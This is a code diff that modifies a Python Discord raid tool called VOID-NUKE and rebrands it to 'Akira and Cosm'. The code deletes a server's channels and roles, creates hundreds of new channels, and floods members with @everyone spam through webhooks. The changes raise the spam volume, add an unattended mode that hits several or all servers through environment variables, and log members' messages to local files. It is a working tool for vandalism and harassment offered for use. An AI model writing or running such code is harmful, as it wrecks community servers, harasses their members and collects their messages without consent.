@@ -1,6 +1,6 @@
 # ══════════════════════════════════════════════════════
-#  VOID-NUKE  v1.0.0  --  by void
-#  discord.gg/W6z9SQgvqc  |  github.com/void4real
+#  VOID-NUKE  v2.0.0  --  by void (modified by egg)
+#  discord.gg/cJ3MRdJWnx  
 # ══════════════════════════════════════════════════════
 
 import os, sys, time, random, asyncio, json, re, webbrowser
@@ -18,27 +18,27 @@ init(autoreset=True)
 
 NO_BAN_KICK_ID = []
 
-PUB         = "||@everyone||  **# RAID BY VOID-NUKE**  :  discord.gg/W6z9SQgvqc  <https://github.com/void4real/Void-Nuke>"
-PUB_SHORT   = "discord.gg/W6z9SQgvqc | github.com/void4real"
-DISCORD_URL = "https://discord.gg/W6z9SQgvqc"
-GITHUB_URL  = "https://github.com/void4real/Void-Nuke"
-RAID_NAME   = "raid-by-void"
-TOOL_NAME   = "VOID-NUKE"
+PUB         = "||@everyone||  **# RAID BY AKIRA AND COSM**  :  discord.gg/cJ3MRdJWnx  <https://discord.gg/9uvTnV972x>"
+PUB_SHORT   = "discord.gg/cJ3MRdJWnx | https://discord.gg/9uvTnV972x"
+DISCORD_URL = "https://discord.gg/cJ3MRdJWnx"
+GITHUB_URL  = "https://discord.gg/9uvTnV972x"
+RAID_NAME   = "raid-by-AKIRA"
+TOOL_NAME   = "Akira and Cosm own you"
 
 AUTO_RAID_CONFIG = {
     "channel_type"   : "text",
     "channel_name"   : RAID_NAME,
-    "num_channels"   : 50,
-    "num_messages"   : 10,
+    "num_channels"   : 100,
+    "num_messages"   : 100,
     "message_content": PUB,
 }
 
 EMBED_CONFIG = {
     "title"      : "\U0001f480  __VOID-NUKE__",
     "description": (
-        "**Ton serveur vient d'\u00eatre raid par VOID-NUKE.**\n\n"
+        "**Ton serveur vient d'\u00eatre raid par Akira.**\n\n"
         "_ _\n"
-        "**> discord.gg/W6z9SQgvqc**\n"
+        "**> discord.gg/cJ3MRdJWnx**\n"
         "**> github.com/void4real**\n"
         "_ _\n"
         "||@everyone||"
@@ -46,21 +46,21 @@ EMBED_CONFIG = {
     "color"      : 0xFF0000,
     "message"    : f"||@everyone||  {PUB}",
     "image"      : "https://media.discordapp.net/attachments/1471977538648674478/1477637266791727155/c51ca65be8fa86b4b8f29a7d15dce335_1.webp",
-    "footer"     : "discord.gg/W6z9SQgvqc  |  github.com/void4real",
+    "footer"     : "discord.gg/cJ3MRdJWnx  |  https://discord.gg/9uvTnV972x",
     "fields"     : [
-        {"name": "\U0001f517 __Discord__", "value": "**discord.gg/W6z9SQgvqc**", "inline": True},
-        {"name": "\U0001f431 __Github__",  "value": "**github.com/void4real**",   "inline": True},
+        {"name": "\U0001f517 __Discord__", "value": "**discord.gg/cJ3MRdJWnx**", "inline": True},
+        {"name": "\U0001f431 __Github__",  "value": "**https://discord.gg/9uvTnV972x**",   "inline": True},
         {"name": "\u26a1 __Tool__",        "value": "**VOID-NUKE v1.0.0**",       "inline": True},
     ],
 }
 
-WEBHOOK_CONFIG = {"default_name": "VOID-NUKE"}
+WEBHOOK_CONFIG = {"default_name": "Akiras-bye-bye"}
 SERVER_CONFIG  = {
-    "new_name"       : "RAIDED BY VOID-NUKE",
+    "new_name"       : "RAIDED BY AKIRA",
     "new_icon"       : "",
-    "new_description": "discord.gg/W6z9SQgvqc",
+    "new_description": "discord.gg/cJ3MRdJWnx",
 }
-BOT_PRESENCE = {"type": "playing", "text": "discord.gg/W6z9SQgvqc"}
+BOT_PRESENCE = {"type": "playing", "text": "discord.gg/cJ3MRdJWnx"}
 
 # ── palette ────────────────────────────────────────────
 RS  = "\033[0m";  B   = "\033[1m"
@@ -135,6 +135,16 @@ def _summary(action: str, ok: int, fail: int, t: float):
     print(f"  {DIM}action{RS}  {wht(action)}")
     print(f"  {R1}{B}[+]{RS} {R2}{ok} ok{RS}   {R3}[-]{RS} {DIM}{fail} err{RS}   {DIM}{t:.2f}s{RS}")
     print(f"  {D2}{'─'*40}{RS}\n")
+    # append basic stats to external log file
+    try:
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+        log_path = os.path.join(base_dir, "void_nuke_stats.log")
+        with open(log_path, "a", encoding="utf-8") as f:
+            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"{ts} | {action} | ok={ok} | err={fail} | {t:.2f}s\n")
+    except Exception:
+        # logging to file should never break the tool
+        pass
 
 def _get_guild(sid: str):
     g = bot.get_guild(int(sid))
@@ -143,20 +153,21 @@ def _get_guild(sid: str):
 
 # ── banner ─────────────────────────────────────────────
 _ART = [
-    r"██╗   ██╗ ██████╗ ██╗██████╗ ",
-    r"██║   ██║██╔═══██╗██║██╔══██╗",
-    r"██║   ██║██║   ██║██║██║  ██║",
-    r"╚██╗ ██╔╝██║   ██║██║██║  ██║",
-    r" ╚████╔╝ ╚██████╔╝██║██████╔╝",
-    r"  ╚═══╝   ╚═════╝ ╚═╝╚═════╝ ",
+    r" █████╗ ██╗  ██╗██╗██████╗  █████╗ ",
+    r"██╔══██╗██║ ██╔╝██║██╔══██╗██╔══██╗",
+    r"███████║█████╔╝ ██║██████╔╝███████║",
+    r"██╔══██║██╔═██╗ ██║██╔══██╗██╔══██║",
+    r"██║  ██║██║  ██╗██║██║  ██║██║  ██║",
+    r"╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝",
 ]
+
 _ART2 = [
     r"  ██╗    ██╗██╗   ██╗██╗  ██╗███████╗ ║               ",
-    r"  ████╗  ██║██║   ██║██║ ██╔╝██╔════╝ ║ by 1s0e       ",
-    r"  ██╔██╗ ██║██║   ██║█████╔╝ █████╗   ╠══════════════ ",
-    r"  ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝   ║.gg/W6z9SQgvqc ",
+    r"  ████╗  ██║██║   ██║██║ ██╔╝██╔════╝ ║ by Eggsploder        ",
+    r"  ██╔██╗ ██║██║   ██║█████╔╝ █████╗   ╠               ",
+    r"  ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝   ║				 ",
     r"  ██║ ╚████║╚██████╔╝██║  ██╗███████╗ ╠══════════════ ",
-    r"  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ║               ",
+    r"  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝",
 ]
 _SHADES = [R1, R1, R2, R2, R3, R3]
 
@@ -230,12 +241,12 @@ def _print_menu(page: int = 1):
     prev = r1("«b»") if page > 1 else dim("   ")
     nxt  = r1("«n»") if page < 3 else dim("   ")
     print(f"\n  {prev} {dim('prev')}    {dim(f'page {page}/3')}    {nxt} {dim('next')}    {dim('«q» quit')}")
-    print(f"\n  {R3}VOID-NUKE v1.0.0{RS}  {DIM}Discord : 1s0e{RS}")
+    print(f"\n  {R3}AKIRA v1.0.0{RS}  {DIM}Discord : 1s0e{RS}")
     print(f"\n  {R1}{B}[Option]{RS} {D2}>>{RS} ", end="", flush=True)
 
 # ── helpers ────────────────────────────────────────────
 def _pub_append(content: str) -> str:
-    if "discord.gg/W6z9SQgvqc" in content: return content
+    if "discord.gg/cJ3MRdJWnx" in content: return content
     return f"{content}\n{PUB}"
 
 async def delete_channel(c) -> bool:
@@ -305,24 +316,24 @@ async def nuke(sid):
         asyncio.gather(*[delete_role(r)    for r in list(g.roles)]),
     )
     log_ok(f"wiped  {cr.count(True)} channels  {rr.count(True)} roles")
-    fx_load("create 50 channels", 22, .014)
-    created = await asyncio.gather(*[g.create_text_channel(RAID_NAME) for _ in range(50)], return_exceptions=True)
+    fx_load("create 500 channels", 22, .014)
+    created = await asyncio.gather(*[g.create_text_channel(RAID_NAME) for _ in range(500)], return_exceptions=True)
     new_chans = [c for c in created if isinstance(c, discord.TextChannel)]
     log_ok(f"{len(new_chans)} channels ready")
     fx_load("create 50 roles", 22, .014)
     async def _make_role():
         try:
             col = discord.Colour.from_rgb(random.randint(180,255), 0, 0)
-            await g.create_role(name="VOID-NUKE", colour=col); return True
+            await g.create_role(name="AKIRA", colour=col); return True
         except: return False
     rr2 = await asyncio.gather(*[_make_role() for _ in range(50)])
     log_ok(f"{rr2.count(True)} roles VOID-NUKE created")
-    fx_load("webhook spam", 22, .014)
+    fx_load("webhook spam", 22, .054)
     async def _raid_chan(chan):
         try:
-            wh = await chan.create_webhook(name="VOID-NUKE TOOLS")
-            for _ in range(5):
-                try: await wh.send(content=PUB, username="VOID-NUKE TOOLS")
+            wh = await chan.create_webhook(name="Akira says bye bye")
+            for _ in range(50):
+                try: await wh.send(content=PUB, username="AKIRA + Cosm ")
                 except: pass
             try: await wh.delete()
             except: pass
@@ -1000,6 +1011,34 @@ async def webhook_logger_check(message: discord.Message):
              f"```{(message.content or '[no text]')[:1700]}```")
     await _dispatch_log(entry)
 
+# ── file message logger (for potential restoration) ─────
+def _file_message_logger(message: discord.Message):
+    """Log non-bot messages to a local file so content can be inspected/restored later."""
+    try:
+        if not message.guild:
+            return  # ignore DMs for safety
+        if message.author == message.guild.me:
+            return
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+        log_dir = os.path.join(base_dir, "message_logs")
+        os.makedirs(log_dir, exist_ok=True)
+        # one file per guild for easier inspection
+        fname = os.path.join(log_dir, f"guild_{message.guild.id}.log")
+        ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+        line = (
+            f"[{ts}] "
+            f"guild={message.guild.id} "
+            f"channel={getattr(message.channel, 'id', 'unknown')} "
+            f"author={message.author.id} "
+            f"username={_vis(str(message.author))} "
+            f"content={_vis(message.content or '[no text]')}\n"
+        )
+        with open(fname, "a", encoding="utf-8") as f:
+            f.write(line)
+    except Exception:
+        # never let logging break the bot
+        pass
+
 # ══════════════════════════════════════════════════════
 #  ACTIONS MAP
 # ══════════════════════════════════════════════════════
@@ -1081,46 +1120,97 @@ def _boot():
     _print_banner(animated=True)
     fx_load("initializing  VOID-NUKE v1.0.0", 24, .016)
     print()
-    _flag = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".void_first")
-    if not os.path.exists(_flag):
-        try:
-            open(_flag, 'w').close()
-            webbrowser.open(DISCORD_URL)
-            time.sleep(.4)
-            webbrowser.open(GITHUB_URL)
-            time.sleep(.4)
-            _star = os.path.join(os.path.dirname(os.path.abspath(__file__)), "star.PNG")
-            if os.path.exists(_star): webbrowser.open(_star)
-        except: pass
 
-_boot()
+env_token   = os.getenv("VOIDNUKE_TOKEN")
+env_servers = os.getenv("VOIDNUKE_SERVERS")
+env_action  = os.getenv("VOIDNUKE_ACTION")  # optional menu code like '01', '02', etc.
+
+# when launched normally, show boot animation and prompt;
+# when launched by a multi-runner with env vars, silently use them
+if not (env_token and env_servers):
+    _boot()
 
 print(f"  {D2}{'─'*46}{RS}")
-bot_token = input(f"  {R1}{B}>>{RS} {wht('token  ')} {D2}:{RS} ").strip()
-server_id = input(f"  {R1}{B}>>{RS} {wht('server id ')} {D2}:{RS} ").strip()
+bot_token = (env_token or input(f"  {R1}{B}>>{RS} {wht('token  ')} {D2}:{RS} ").strip())
+server_ids = (env_servers or input(f"  {R1}{B}>>{RS} {wht('server id(s) or all')} {D2}:{RS} ").strip())
 print(f"  {D2}{'─'*46}{RS}\n")
 
-if not bot_token or not server_id:
-    print(f"  {R3}[-] token and server ID required{RS}"); sys.exit(1)
+if not bot_token or not server_ids:
+    print(f"  {R3}[-] token and server ID required{RS}")
+    sys.exit(1)
 
 intents = discord.Intents.all()
-bot     = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix='!', intents=intents)
 
 @bot.event
 async def on_ready():
     _clr()
-    guild = bot.get_guild(int(server_id))
-    _print_banner(bot.user.name, guild.name if guild else "not found",
-                  guild.member_count if guild else 0, animated=True)
+
+    if server_ids.lower() == "all":
+        guilds = bot.guilds
+    else:
+        ids = [x.strip() for x in server_ids.split(",")]
+        guilds = [bot.get_guild(int(i)) for i in ids]
+
+    guilds = [g for g in guilds if g]
+
+    if not guilds:
+        log_err("bot not in any provided servers")
+        return
+
+    first = guilds[0]
+
+    _print_banner(
+        bot.user.name,
+        f"{len(guilds)} server(s)",
+        sum(g.member_count for g in guilds),
+        animated=True
+    )
+
     fx_spin("authenticating", .7)
-    if not guild: log_err("bot not in this server"); return
-    log_ok(f"ready  {guild.name}  ({guild.member_count} members)")
+
+    for g in guilds:
+        log_ok(f"ready  {g.name}  ({g.member_count} members)")
+
     try:
         pt = getattr(ActivityType, BOT_PRESENCE["type"].lower(), ActivityType.playing)
         await bot.change_presence(activity=Activity(type=pt, name=BOT_PRESENCE["text"]))
-    except: pass
+    except:
+        pass
 
-    acts = _actions(server_id, bot.user.id)
+    # if an auto action code is provided via env (multi-run mode),
+    # run that action on all selected guilds and exit without showing menu
+    if env_action:
+        log_info(f"auto mode: action {env_action} on {len(guilds)} guild(s)")
+        tasks = []
+        for g in guilds:
+            acts = _actions(g.id, bot.user.id)
+            if env_action in acts:
+                tasks.append(acts[env_action]())
+            else:
+                log_err(f"unknown action code {env_action} for guild {g.name}")
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+        await bot.close()
+        return
+
+    # interactive single-bot mode (original behaviour)
+    guild_map = {str(g.id): g for g in guilds}
+
+    print()
+    print("  Available servers:")
+    for g in guilds:
+        print(f"   {g.id}  |  {g.name}")
+
+    sid = _ask("select server id")
+
+    guild = guild_map.get(sid)
+
+    if not guild:
+        log_err("invalid server id")
+        return
+
+    acts = _actions(guild.id, bot.user.id)
     page = 1
 
     while True:
@@ -1166,8 +1256,10 @@ async def on_ready():
 @bot.event
 async def on_message(message: discord.Message):
     await webhook_logger_check(message)
+    _file_message_logger(message)
     await bot.process_commands(message)
 
 if __name__ == "__main__":
 
     bot.run(bot_token, log_handler=None)
+
